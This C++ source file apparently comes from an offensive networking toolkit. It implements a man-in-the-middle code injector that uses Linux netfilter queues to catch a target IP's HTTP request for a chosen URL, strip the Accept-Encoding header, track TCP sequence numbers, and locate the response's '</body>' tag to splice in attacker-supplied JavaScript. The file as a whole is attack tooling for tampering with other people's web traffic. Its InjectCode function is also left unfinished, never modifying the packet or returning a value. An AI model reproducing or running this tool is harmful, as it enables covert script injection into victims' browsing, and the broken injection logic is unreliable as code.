#include "CodeInjector.h"

#include <iostream>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip6.h>
#include <netinet/tcp.h>
#include <linux/netfilter.h>
#include <poll.h>
#include <cstring>

// network byte order
uint32_t clientAckNum{0}; 
uint32_t clientSeqNum{0};
uint32_t serverAckNum{0};
uint32_t serverSeqNum{0};


bool32 processRequest{TRUE};
bool32 processServer{FALSE};
bool32 processClient{FALSE};

/*
    filters for the http request that contains the url the user wishes to inject with js code. If a matching
    packet is found, the clientAckNum gets set and can later be used to filter for the matching response. clientSeqNum
    is also set.
*/
static bool32 FilterReq(const char* url, tcphdr* tcpHeader, char* payload, uint32_t& clientAckNum)
{
    uint32_t res = PacketCraft::GetTCPDataProtocol((TCPHeader*)tcpHeader); // TODO: is this a safe cast?
    if(res == PC_HTTP_REQUEST)
    {
        if(PacketCraft::GetHTTPMethod((uint8_t*)payload) == PC_HTTP_GET)
        {
            char packetFileName[255]{};
            char packetDomainName[255]{};
            char packetFullURL[1024]{};

            char buffer[255]{};

            // Copy the first line of the http request in buffer. Should be something like this: "GET /test/file.php HTTP/1.1"
            PacketCraft::CopyStrUntil(buffer, sizeof(buffer), payload, '\n');

            int filePathStartIndex = 4;
            int filePathEndIndex = PacketCraft::FindInStr(buffer, " HTTP");
            memcpy(packetFileName, buffer + filePathStartIndex, filePathEndIndex - filePathStartIndex);
            memset(buffer, '\0', sizeof(buffer));
            packetFileName[filePathEndIndex] = '\0';

            // Copy the line containing the host domain name in buffer. Should be something like this: "Host: example.test.com"
            // TODO: support case-insensitivity
            int hostIndex = PacketCraft::FindInStr(payload, "Host: ");
            if(hostIndex == -1)
            {
                return FALSE;
            }

            PacketCraft::CopyStrUntil(buffer, sizeof(buffer), payload + hostIndex, '\n');

            // get rid of the "Host: " portion
            int domainStartIndex = 6;
            int domainEndIndex = PacketCraft::FindInStr(buffer, "\r\n");
            memcpy(packetDomainName, buffer + domainStartIndex, domainEndIndex - domainStartIndex);
            memset(buffer, '\0', sizeof(buffer));
            packetDomainName[domainEndIndex] = '\0';

            PacketCraft::ConcatStr(packetFullURL, sizeof(packetFullURL), packetDomainName, packetFileName);

            // make sure the url in the received packet matches the url the user wants to inject
            if(PacketCraft::CompareStr(packetFullURL, url) == TRUE)
            {
                // save the ack num of the request. this is later used to filter for the correct response
                clientAckNum = tcpHeader->ack_seq;
                clientSeqNum = tcpHeader->seq;
                return TRUE;
            }
        }
    }
    return FALSE;
}

static int RemoveEncoding(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint32_t payloadLen)
{
    char* buffer = (char*)malloc(payloadLen);
    memcpy(buffer, payload, payloadLen);

    // convert to upper case because http header fields are not case sensitive
    for(unsigned int i = 0; i < payloadLen; ++i)
    {
        if(buffer[i] > 96 && buffer[i] < 123)
            buffer[i] = std::toupper(buffer[i]);
    }

    int matchStartIndex = PacketCraft::FindInStr(buffer, "ACCEPT-ENCODING: ");
    if(matchStartIndex == -1)
    {   
        free(buffer);
        return NO_ERROR;
    }

    int matchLen = PacketCraft::FindInStr(buffer + matchStartIndex, "\r\n") + 2; // length of ACCEPT-ENCODING: <encoding>\r\n
/*
    std::cout << "match len: " << matchLen << std::endl;
    std::cout << "match: ";
    for(int i = 0; i < matchLen; ++i)
    {
        if((buffer + matchStartIndex)[i] == '\r')
            std::cout << "\\r";
        else if((buffer + matchStartIndex)[i] == '\n')
            std::cout << "\\n";
        else
            std::cout << (buffer + matchStartIndex)[i];
    }

    std::cout << std::endl;
*/

    if(ipVersion == AF_INET)
    {
        if(nfq_tcp_mangle_ipv4(pkBuff, matchStartIndex, matchLen, "", 0) < 0)
        {
            free(buffer);
            LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv4() error");
            return APPLICATION_ERROR;
        }
    }
    else // NOTE: NOT TESTED!
    {
        if(nfq_tcp_mangle_ipv6(pkBuff, matchStartIndex, matchLen, "", 0) < 0)
        {
            free(buffer);
            LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv6() error");
            return APPLICATION_ERROR;
        }
    }

    free(buffer);
    return NO_ERROR;

}

static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint32_t payloadLen, 
    CHaks::NetFilterCallbackData& callbackData)
{
    char* buffer = (char*)malloc(payloadLen + callbackData.codeLen + 1);
    memset(buffer, '\0', payloadLen + callbackData.codeLen + 1);
    memcpy(buffer, payload, payloadLen);

    // convert to uppercase because it is case-insensitive
    for(unsigned int i = 0; i < payloadLen; ++i)
    {
        if(buffer[i] > 96 && buffer[i] < 123)
            buffer[i] = std::toupper(buffer[i]);
    }

    int contentLengthStartIndex = PacketCraft::FindInStr(buffer, "CONTENT-LENGTH: ") + 16;
    int contentLengthEndIndex = PacketCraft::FindInStr(buffer + contentLengthStartIndex, "\r\n");
    int contentLenStrSize = contentLengthEndIndex - contentLengthStartIndex;
    char* contentLenStr = (char*)malloc(contentLenStrSize + 1);
    memcpy(contentLenStr, buffer + contentLengthStartIndex, contentLenStrSize);
    contentLenStr[contentLenStrSize] = '\0';
    int contentLen = atoi(contentLenStr);

    char newContentLenStr[64]{};
    snprintf(newContentLenStr, 64, "%d", callbackData.codeLen + contentLen);
    int newContentLen = atoi(newContentLenStr);
}

 static int nfq_send_verdict(int queue_num, uint32_t id, mnl_socket* nl, pkt_buff* pkBuff, int verdict = NF_ACCEPT)
 {
    char buf[MNL_SOCKET_BUFFER_SIZE];
    nlmsghdr* nlh;
    nlattr* nest;

    nlh = nfq_nlmsg_put(buf, NFQNL_MSG_VERDICT, queue_num);

    if(pktb_mangled(pkBuff))
    {
        std::cout << "packet was mangled" << std::endl;
        nfq_nlmsg_verdict_put_pkt(nlh, pktb_data(pkBuff), pktb_len(pkBuff));
    }

    nfq_nlmsg_verdict_put(nlh, id, verdict);

    /* example to set the connmark. First, start NFQA_CT section: */
    nest = mnl_attr_nest_start(nlh, NFQA_CT);

    /* then, add the connmark attribute: */
    mnl_attr_put_u32(nlh, CTA_MARK, htonl(42));
    /* more conntrack attributes, e.g. CTA_LABELS could be set here */

    /* end conntrack section */
    mnl_attr_nest_end(nlh, nest);

    if(mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) 
    {
        LOG_ERROR(APPLICATION_ERROR, "mnl_socket_sendto() error");
        return APPLICATION_ERROR;
    }

    return NO_ERROR;
 }

 // returns -1 on error, 1 when packet does not match criteria, 0 when the correct packet is found and processed
 int ProcessRequest(uint32_t ipVersion, iphdr* ipv4Header, ip6_hdr* ipv6Header,  tcphdr* tcpHeader, char* tcpPayload, 
    uint32_t tcpPayloadLen, CHaks::NetFilterCallbackData& callbackData)
 {
    // Filter for a matching IP
    if(ipVersion == AF_INET)
    {
        sockaddr_in targetAddr{};
        inet_pton(AF_INET, callbackData.targetIPStr, &targetAddr.sin_addr);
        if(targetAddr.sin_addr.s_addr != ipv4Header->saddr)
            return 1;
    }
    else if(ipVersion == AF_INET6)
    {
        sockaddr_in6 targetAddr{};
        inet_pton(AF_INET6, callbackData.targetIPStr, &targetAddr.sin6_addr);
        if(memcmp(targetAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_src.__in6_u.__u6_addr8, IPV6_ALEN) != 0)
            return 1;
    }
    //////////

    if(FilterReq(callbackData.url, tcpHeader, (char*)tcpPayload, clientAckNum) == TRUE)
    {
        if(ipVersion == AF_INET)
        {
            if(inet_ntop(AF_INET, &ipv4Header->daddr, callbackData.serverIPStr, INET6_ADDRSTRLEN) == nullptr)
            {
                LOG_ERROR(APPLICATION_ERROR, "inet_ntop() error");
                return -1;
            }
        }
        else
        {
            if(inet_ntop(AF_INET6, &ipv6Header->ip6_dst, callbackData.serverIPStr, INET6_ADDRSTRLEN) == nullptr)
            {
                LOG_ERROR(APPLICATION_ERROR, "inet_ntop() error");
                return -1;
            }
        }

        return 0;
    }

    return 1;
 }

  // returns -1 on error, 1 when packet does not match criteria, 0 when the correct packet is found and processed, 2 when
  // a packet belonging to the correct tcp flow is found but it's not the one containing the </body> tag
 static int ProcessServer(uint32_t ipVersion, iphdr* ipv4Header, ip6_hdr* ipv6Header, tcphdr* tcpHeader, 
    char* tcpPayload, uint32_t tcpPayloadLen, CHaks::NetFilterCallbackData& callbackData)
 {
    // Filter for a matching IP
    if(ipVersion == AF_INET)
    {
        sockaddr_in targetAddr{};
        inet_pton(AF_INET, callbackData.targetIPStr, &targetAddr.sin_addr);
        if(targetAddr.sin_addr.s_addr != ipv4Header->daddr)
            return 1;
    }
    else if(ipVersion == AF_INET6)
    {
        sockaddr_in6 targetAddr{};
        inet_pton(AF_INET6, callbackData.targetIPStr, &targetAddr.sin6_addr);
        if(memcmp(targetAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_dst.__in6_u.__u6_addr8, IPV6_ALEN) != 0)
            return 1;
    }
    //////////

    if(tcpHeader->seq == clientAckNum)
    {
        serverAckNum = tcpHeader->ack_seq;
        serverSeqNum = tcpHeader->seq;

        if(tcpPayloadLen > 0)
        {
            int res = PacketCraft::FindInStr(tcpPayload, "</body>");
            if(res > -1)
            {
                return 0;
            }
        }

        return 2;
    }

    return 1;
 }

// returns -1 on error, 1 when packet does not match criteria, 0 when the correct packet is found and processed
static int ProcessClient(uint32_t ipVersion, iphdr* ipv4Header, ip6_hdr* ipv6Header, tcphdr* tcpHeader, 
    CHaks::NetFilterCallbackData& callbackData)
{
    // Filter for a matching IP
    if(ipVersion == AF_INET)
    {
        sockaddr_in targetAddr{};
        inet_pton(AF_INET, callbackData.targetIPStr, &targetAddr.sin_addr);
        if(targetAddr.sin_addr.s_addr != ipv4Header->saddr)
            return 1;
    }
    else if(ipVersion == AF_INET6)
    {
        sockaddr_in6 targetAddr{};
        inet_pton(AF_INET6, callbackData.targetIPStr, &targetAddr.sin6_addr);
        if(memcmp(targetAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_src.__in6_u.__u6_addr8, IPV6_ALEN) != 0)
            return 1;
    }
    //////////

    if(tcpHeader->seq == serverAckNum)
    {
        clientAckNum = tcpHeader->ack_seq;
        clientSeqNum = tcpHeader->seq;

        return 0;
    }

    return 1;
}


static int queueCallback(const nlmsghdr *nlh, void *data)
{
    nfqnl_msg_packet_hdr* ph{nullptr};
    nlattr* attr[NFQA_MAX + 1]{};
    nfgenmsg*nfg{nullptr};

    CHaks::NetFilterCallbackData callbackData = *(CHaks::NetFilterCallbackData*)data;

    if(nfq_nlmsg_parse(nlh, attr) < 0) 
    {
        LOG_ERROR(APPLICATION_ERROR, "nfq_nlmsg_parse() error");
        return MNL_CB_ERROR;
    }

    nfg = (nfgenmsg*)mnl_nlmsg_get_payload(nlh);
    if(nfg == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "mnl_nlmsg_get_payload() error");
        return MNL_CB_ERROR;
    }

    if(attr[NFQA_PACKET_HDR] == NULL) 
    {
        LOG_ERROR(APPLICATION_ERROR, "metaheader not set");
        return MNL_CB_ERROR;
    }

    ph = (nfqnl_msg_packet_hdr*)mnl_attr_get_payload(attr[NFQA_PACKET_HDR]);
    if(ph == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "mnl_attr_get_payload() NFQA_PACKET_HDR error");
        return MNL_CB_ERROR;
    }

    uint16_t plen{0};
    uint8_t* payload{nullptr};

    plen = mnl_attr_get_payload_len(attr[NFQA_PAYLOAD]);
    payload = (uint8_t*)mnl_attr_get_payload(attr[NFQA_PAYLOAD]);
    if(payload == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "mnl_attr_get_payload() NFQA_PAYLOAD error");
        return MNL_CB_ERROR;
    }

    uint32_t ipVersion{};
    if(ntohs(ph->hw_protocol) == ETH_P_IP)
        ipVersion = AF_INET;
    else if(ntohs(ph->hw_protocol) == ETH_P_IPV6)
        ipVersion = AF_INET6;

    pkt_buff* pkBuff = pktb_alloc(ipVersion, payload, plen, 4'096);
    if(pkBuff == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "pktb_alloc() error");
        return MNL_CB_ERROR;
    }

    iphdr* ipv4Header{nullptr};
    ip6_hdr* ipv6Header{nullptr};
    tcphdr* tcpHeader{nullptr};

    bool32 hasTCPLayer{FALSE};

    // Get IP header and set transport layer
    if(ipVersion == AF_INET)
    {
        ipv4Header = nfq_ip_get_hdr(pkBuff);
        if(ipv4Header == nullptr)
        {
            LOG_ERROR(APPLICATION_ERROR, "nfq_ip_get_hdr() error");
            return MNL_CB_ERROR;
        }

        if(nfq_ip_set_transport_header(pkBuff, ipv4Header) < 0)
        {
            LOG_ERROR(APPLICATION_ERROR, "nfq_ip_set_transport_header() error");
            return MNL_CB_ERROR;
        }

        if(ipv4Header->protocol == IPPROTO_TCP)
            hasTCPLayer = TRUE;
        else
            hasTCPLayer = FALSE;
    }
    else if(ipVersion == AF_INET6)
    {
        ipv6Header = nfq_ip6_get_hdr(pkBuff);
        if(ipv6Header == nullptr)
        {
            LOG_ERROR(APPLICATION_ERROR, "nfq_ip6_get_hdr()");
            return MNL_CB_ERROR;
        }

        int res = nfq_ip6_set_transport_header(pkBuff, ipv6Header, IPPROTO_TCP);
        if(res == 1)
            hasTCPLayer = TRUE;
        else
            hasTCPLayer = FALSE;
    }
    //////////

    // any packet that has no tcp layer will be allowed through
    if(hasTCPLayer == FALSE)
    {
        if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
        {
            LOG_ERROR(APPLICATION_ERROR, "nfq_send_verdict() error");
            return MNL_CB_ERROR;
        }

        return MNL_CB_OK;
    }

    // get the tcp header
    tcpHeader = nfq_tcp_get_hdr(pkBuff);
    if(tcpHeader == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_get_hdr");
        return -1;
    }

    void *tcpPayload = nfq_tcp_get_payload(tcpHeader, pkBuff);
    if(tcpPayload == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_get_payload() error");
        return -1;
    }

    unsigned int tcpPayloadLen = nfq_tcp_get_payload_len(tcpHeader, pkBuff);
    /////////

    // process the inital start of the communication
    if(processRequest == TRUE)
    {
        int res = ProcessRequest(ipVersion, ipv4Header, ipv6Header, tcpHeader, (char*)tcpPayload, tcpPayloadLen, callbackData);
        if(res == 0)
        {
            if(RemoveEncoding(ipVersion, pkBuff, (char*)tcpPayload, tcpPayloadLen) == APPLICATION_ERROR)
            {
                pktb_free(pkBuff);
                LOG_ERROR(APPLICATION_ERROR, "RemoveEncoding() error");
                return MNL_CB_ERROR;
            }

            processRequest = FALSE;
            processServer = TRUE;
            processClient = FALSE;

            std::cout << "request processed succesfully, encoding removed and client ack and seq number set\n";
        }
        else if(res == -1)
        {
            pktb_free(pkBuff);
            LOG_ERROR(APPLICATION_ERROR, "ProcessRequest() error");
            return MNL_CB_ERROR;
        }
    }
    else
    {
        if(processServer == TRUE)
        {
            int res = ProcessServer(ipVersion, ipv4Header, ipv6Header, tcpHeader, (char*)tcpPayload, tcpPayloadLen, callbackData);
            if(res == 0)
            {
                if(InjectCode(ipVersion, pkBuff, (char*)tcpPayload, tcpPayloadLen, callbackData) == APPLICATION_ERROR)
                {
                    pktb_free(pkBuff);
                    LOG_ERROR(APPLICATION_ERROR, "RemoveEncoding() error");
                    return MNL_CB_ERROR;
                }

                processRequest = FALSE;
                processClient = FALSE;
                processServer = FALSE;
            }
            else if(res == 2)
            {
                processClient = TRUE;
                processServer = FALSE;
            }
            else if(res == -1)
            {
                pktb_free(pkBuff);
                LOG_ERROR(APPLICATION_ERROR, "ProcessResponse() error");
                return MNL_CB_ERROR;
            }
        }
        else if(processClient == TRUE)
        {
            int res = ProcessClient(ipVersion, ipv4Header, ipv6Header, tcpHeader, callbackData);
            if(res == 0)
            {
                processServer = TRUE;
                processClient = FALSE;
            }
            else if(res == -1)
            {
                pktb_free(pkBuff);
                LOG_ERROR(APPLICATION_ERROR, "ProcessResponse() error");
                return MNL_CB_ERROR;
            }
        }
    }

    if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "nfq_send_verdict() error");
        return MNL_CB_ERROR;
    }

    return MNL_CB_OK;
}

CHaks::CodeInjector::CodeInjector() :
    queueNum(0),
    handler(nullptr),
    queue(nullptr)
{

}

CHaks::CodeInjector::~CodeInjector()
{
    if(queue != nullptr)
        nfq_destroy_queue(queue);

    if(handler != nullptr)
        nfq_close(handler);
}

int CHaks::CodeInjector::Init(const uint32_t ipVersion, const char* interfaceName, const char* targetIP, int queueNum,
    const char* url, const char* injectCode, int injectCodeLen)
{
    this->queueNum = queueNum;

    callbackData.ipVersion = ipVersion;
    callbackData.targetIPStr = targetIP;
    callbackData.interfaceName = interfaceName;
    callbackData.url = url;
    callbackData.code = injectCode;
    callbackData.codeLen = injectCodeLen;

    return NO_ERROR;
}

int CHaks::CodeInjector::Run()
{
    char* buffer{nullptr};
    nlmsghdr* nlh{nullptr};
    /* largest possible packet payload, plus netlink data overhead: */
    size_t bufferSize = 0xffff + (MNL_SOCKET_BUFFER_SIZE/2);
    int res;

    callbackData.nl = mnl_socket_open(NETLINK_NETFILTER);
    if(callbackData.nl == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "mnl_socket_open() error");
        return APPLICATION_ERROR;
    }

    if(mnl_socket_bind(callbackData.nl, 0, MNL_SOCKET_AUTOPID) < 0) 
    {
        mnl_socket_close(callbackData.nl);
        LOG_ERROR(APPLICATION_ERROR, "mnl_socket_bind() error");
        return APPLICATION_ERROR;
    }

    portId = mnl_socket_get_portid(callbackData.nl);

    buffer = (char*)malloc(bufferSize);
    if(!buffer) 
    {
        mnl_socket_close(callbackData.nl);
        LOG_ERROR(APPLICATION_ERROR, "malloc() error");
        return APPLICATION_ERROR;
    }

    nlh = nfq_nlmsg_put(buffer, NFQNL_MSG_CONFIG, queueNum);
    if(nlh == nullptr)
    {
        mnl_socket_close(callbackData.nl);
        free(buffer);
        LOG_ERROR(APPLICATION_ERROR, "nfq_nlmsg_put() error");
        return APPLICATION_ERROR;
    }

    nfq_nlmsg_cfg_put_cmd(nlh, callbackData.ipVersion, NFQNL_CFG_CMD_BIND);

    if(mnl_socket_sendto(callbackData.nl, nlh, nlh->nlmsg_len) < 0) 
    {
        mnl_socket_close(callbackData.nl);
        free(buffer);
        LOG_ERROR(APPLICATION_ERROR, "mnl_socket_sendto() error");
        return APPLICATION_ERROR;
    }
 
    nlh = nfq_nlmsg_put(buffer, NFQNL_MSG_CONFIG, queueNum);
    if(nlh == nullptr)
    {
        mnl_socket_close(callbackData.nl);
        free(buffer);
        LOG_ERROR(APPLICATION_ERROR, "nfq_nlmsg_put() error");
        return APPLICATION_ERROR;
    }

    nfq_nlmsg_cfg_put_params(nlh, NFQNL_COPY_PACKET, IP_MAXPACKET);
    mnl_attr_put_u32(nlh, NFQA_CFG_FLAGS, htonl(NFQA_CFG_F_GSO));
    mnl_attr_put_u32(nlh, NFQA_CFG_MASK, htonl(NFQA_CFG_F_GSO));

    if(mnl_socket_sendto(callbackData.nl, nlh, nlh->nlmsg_len) < 0) 
    {
        mnl_socket_close(callbackData.nl);
        free(buffer);
        LOG_ERROR(APPLICATION_ERROR, "mnl_socket_sendto() error");
        return APPLICATION_ERROR;
    }

    /* ENOBUFS is signalled to userspace when packets were lost
    * on kernel side.  In most cases, userspace isn't interested
    * in this information, so turn it off.
    */
    res = 1;
    mnl_socket_setsockopt(callbackData.nl, NETLINK_NO_ENOBUFS, &res, sizeof(int));

    pollfd pollFds[2]{-1, -1};
    pollFds[0].fd = 0;
    pollFds[0].events = POLLIN;
    pollFds[1].fd = mnl_socket_get_fd(callbackData.nl);
    pollFds[1].events = POLLIN;

    while(true)
    {
        int nEvents = poll(pollFds, sizeof(pollFds) / sizeof(pollFds[0]), -1);
        if(nEvents == -1)
        {
            mnl_socket_close(callbackData.nl);
            free(buffer);
            LOG_ERROR(APPLICATION_ERROR, "poll() error");
            return APPLICATION_ERROR;
        }
        else if(pollFds[1].revents & POLLIN) // we have a packet in the queue
        {
            res = mnl_socket_recvfrom(callbackData.nl, buffer, bufferSize);
            if (res == -1) 
            {
                mnl_socket_close(callbackData.nl);
                free(buffer);
                LOG_ERROR(APPLICATION_ERROR, "mnl_socket_recvfrom() error");
                return APPLICATION_ERROR;
            }

            res = mnl_cb_run(buffer, res, 0, portId, queueCallback, &callbackData);
            if (res < 0)
            {
                mnl_socket_close(callbackData.nl);
                free(buffer);
                LOG_ERROR(APPLICATION_ERROR, "mnl_cb_run() error");
                return APPLICATION_ERROR;
            }
        }
        else if(pollFds[0].revents & POLLIN) // user hit a key and wants to quit program
        {
            break;
        }
        else
        {
            mnl_socket_close(callbackData.nl);
            free(buffer);
            LOG_ERROR(APPLICATION_ERROR, "unknown poll() error!");
            return APPLICATION_ERROR;
        }

    }

    mnl_socket_close(callbackData.nl);
    free(buffer);
    return NO_ERROR;
}